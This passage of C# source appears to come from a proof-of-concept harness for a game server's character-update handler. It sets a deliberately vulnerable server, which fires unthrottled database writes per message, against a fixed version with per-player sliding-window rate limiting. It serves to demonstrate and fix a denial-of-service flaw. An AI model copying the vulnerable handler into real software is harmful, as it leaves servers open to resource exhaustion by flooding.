/// Mirrors the vulnerable code: every incoming message fires a DB write,
/// no rate limiting, no concurrency cap per player.
/// </summary>
sealed class VulnerableServer(SimulatedDatabase db)
{
    private long _received;
    private long _pending;

    public long MessagesReceived => Volatile.Read(ref _received);
    public long PendingDbTasks   => Volatile.Read(ref _pending);

    // Mirrors: async void HandleUpdateCharacterMessage(MsgUpdateCharacter message)
    public void HandleUpdateCharacterMessage(Guid userId, int slot, string profile)
    {
        Interlocked.Increment(ref _received);

        // ⚠ Fire-and-forget: no rate check, no queue depth guard.
        Interlocked.Increment(ref _pending);
        _ = Execute(userId, slot, profile);
    }

    private async Task Execute(Guid userId, int slot, string profile)
    {
        try   { await db.WriteAsync(userId, slot, profile); }
        finally { Interlocked.Decrement(ref _pending); }
    }
}

/// <summary>
/// Fixed version: applies a per-player sliding window rate limit before
/// allowing a DB write — mirrors PlayerRateLimitManager already used in
/// ChatManager and BwoinkSystem.
/// </summary>
sealed class ProtectedServer(SimulatedDatabase db, int maxPerPeriod, TimeSpan period)
{
    private readonly Dictionary<Guid, SlidingWindow> _windows = new();
    private readonly Lock _windowsLock = new();

    private long _received;
    private long _blocked;
    private long _pending;

    public long MessagesReceived => Volatile.Read(ref _received);
    public long MessagesBlocked  => Volatile.Read(ref _blocked);
    public long PendingDbTasks   => Volatile.Read(ref _pending);

    public void HandleUpdateCharacterMessage(Guid userId, int slot, string profile)
    {
        Interlocked.Increment(ref _received);

        // ✅ Look up or create the player's sliding window
        SlidingWindow window;
        lock (_windowsLock)
        {
            if (!_windows.TryGetValue(userId, out window!))
                _windows[userId] = window = new SlidingWindow(maxPerPeriod, period);
        }

        // ✅ If over the limit: drop the message immediately, no DB Task spawned
        if (!window.TryAcquire())
        {
            Interlocked.Increment(ref _blocked);
            return;
        }

        Interlocked.Increment(ref _pending);
        _ = Execute(userId, slot, profile);
    }

    private async Task Execute(Guid userId, int slot, string profile)
    {
        try   { await db.WriteAsync(userId, slot, profile); }
        finally { Interlocked.Decrement(ref _pending); }
    }
}

/// <summary>
/// Fixed-size sliding window rate limiter (same algorithm as
/// PlayerRateLimitManager in Content.Server/Players/RateLimiting/).
/// Thread-safe via spinlock-style Lock.
/// </summary>
sealed class SlidingWindow(int max, TimeSpan period)
{
    private readonly Queue<long> _timestamps = new();
    private readonly Lock _lock = new();

    public bool TryAcquire()
    {
        lock (_lock)
        {
            var now    = Stopwatch.GetTimestamp();
            var cutoff = now - (long)(period.TotalSeconds * Stopwatch.Frequency);

            while (_timestamps.Count > 0 && _timestamps.Peek() < cutoff)
                _timestamps.Dequeue();

            if (_timestamps.Count >= max)
                return false;

            _timestamps.Enqueue(now);
            return true;
        }
    }
}

/// <summary>Thread-safe maximum tracker.</summary>
sealed class PeakCounter
{
    private long _peak;
    public long Value => Volatile.Read(ref _peak);

    public void Update(long current)
    {
        long prev;
        do
        {
            prev = Volatile.Read(ref _peak);
            if (current <= prev) return;
        }
        while (Interlocked.CompareExchange(ref _peak, current, prev) != prev);
    }
}
